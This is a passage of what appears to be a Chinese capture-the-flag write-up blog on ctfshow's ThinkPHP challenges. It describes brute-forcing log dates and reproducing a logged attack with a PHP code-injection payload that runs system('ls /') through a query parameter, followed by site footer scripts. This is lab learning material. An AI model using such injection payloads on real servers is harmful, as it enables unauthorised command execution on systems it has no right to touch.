<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231222124806690.png" alt="image-20231222124806690"></p>
<p>设置一下爆破的格式（题目告诉我们爆破不超过365次）</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231222124822263.png" alt="image-20231222124822263"></p>
<p>更改年份多爆几次，最后得到另一个日志的日期为21_04_15</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231222125201524.png" alt="image-20231222125201524"></p>
<p>可以看到这里的日志内容是进行了一次命令执行</p>
<p>我们尝试复现一下</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231222125424301.png" alt="image-20231222125424301"></p>
<p>那么我们的payload就是</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">/index.php?showctf=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="web573（sql注入）"><a href="#web573（sql注入）" class="headerlink" title="web573（sql注入）"></a>web573（sql注入）</h1>
    </div>
    
    
    
    
    
    
    
</div>

            </div>
            </transition>
            
            <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
            </transition>
            
        </div>
        <script src="/blog/js/main.js"></script>
        
        




         
        
    <div id="vcomments"></div>
    
        <script src="/blog/js/lib/valine.min.js"></script>
            <script>
                new Valine({
                    el: '#vcomments',
                    app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
                    app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
                    visitor: 'true',
                    placeholder: '写点什么吧(●ˇ∀ˇ●)',
                    serverURLs: 'https://u9mzlkun.lc-cn-e1-shared.com',
                });
            </script>

        <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
            <span id="busuanzi_container_site_uv"> 
                本站访客数<span id="busuanzi_value_site_uv"></span>人次
            </span>
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

